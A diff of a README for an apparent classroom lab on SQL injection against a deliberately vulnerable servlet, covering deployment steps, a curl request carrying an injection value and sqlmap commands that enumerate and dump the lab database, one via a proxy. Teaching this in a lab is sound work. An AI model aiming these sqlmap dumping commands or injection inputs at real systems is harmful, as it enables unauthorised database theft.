@@ -1,14 +1,17 @@
-Servlet: Search
+Example: Servlet-Search (SQL Injection)
 -------------------------------------------------------------------------------
 
-How to access the Web application from a browser?
--------------------------------------------------------------------------------
+We use Maven to build and deploy the web application:
 
-URL: http://lab.se.org:8080/Servlet-Search/
+$ mvn wildfly:deploy
 
+Note that we also have to setup the database table:
 
-How to access the Web application from cURL?
--------------------------------------------------------------------------------
+$ mysql -ustudent -pstudent
+MariaDB [testdb]> use testdb;
+copy + paste: sql/createUser.sql
+
+URL: http://localhost:8080/Servlet-Search/
 
 $ curl -i -X GET "http://localhost:8080/Servlet-Search/controller?username=bart&action=Search"
     
@@ -23,23 +26,23 @@ $ curl -i -X GET "http://localhost:8080/Servlet-Search/controller?username=%27+O
 
 How to use sqlmap to attack this Web application?
 -------------------------------------------------------------------------------
-Here we use sqlmap from Kali Linux:
+Here we use sqlmap from Kali Linux (10.0.2.15):
 
-$ python sqlmap.py -u "http://lab.se.org:8080/Servlet-Search/controller?username=Simpson&action=Search"
+$ sqlmap -u "http://10.0.2.15:8080/Servlet-Search/controller?username=Simpson&action=Search"
 		
-$ python sqlmap.py -u "http://lab.se.org:8080/Servlet-Search/controller?username=Simpson&action=Search" --tables
+$ sqlmap -u "http://10.0.2.15:8080/Servlet-Search/controller?username=Simpson&action=Search" --tables
 		
-$ python sqlmap.py -u "http://lab.se.org:8080/Servlet-Search/controller?username=Simpson&action=Search" -D testdb --columns
+$ sqlmap -u "http://10.0.2.15:8080/Servlet-Search/controller?username=Simpson&action=Search" -D testdb --columns
 
-$ python sqlmap.py -u "http://lab.se.org:8080/Servlet-Search/controller?username=Simpson&action=Search" -D testdb --schema
+$ sqlmap -u "http://10.0.2.15:8080/Servlet-Search/controller?username=Simpson&action=Search" -D testdb --schema
 
-$ python sqlmap.py -u "http://lab.se.org:8080/Servlet-Search/controller?username=Simpson&action=Search" -D testdb --count
+$ sqlmap -u "http://10.0.2.15:8080/Servlet-Search/controller?username=Simpson&action=Search" -D testdb --count
 
-$ python sqlmap.py -u "http://lab.se.org:8080/Servlet-Search/controller?username=Simpson&action=Search" -D testdb --dump
+$ sqlmap -u "http://10.0.2.15:8080/Servlet-Search/controller?username=Simpson&action=Search" -D testdb --dump
 
 If we need want to use an interception proxy, we type:
 
-$ python sqlmap.py --proxy=http://localhost:8010 -u "http://10.0.2.7:8080/Servlet-Search/controller?username=Simpson&action=Search" -D testdb --dump
+$ sqlmap --proxy=http://10.0.2.15:8010 -u "http://10.0.2.15:8080/Servlet-Search/controller?username=Simpson&action=Search" -D testdb --dump
 
 Database: testdb
 Table: user
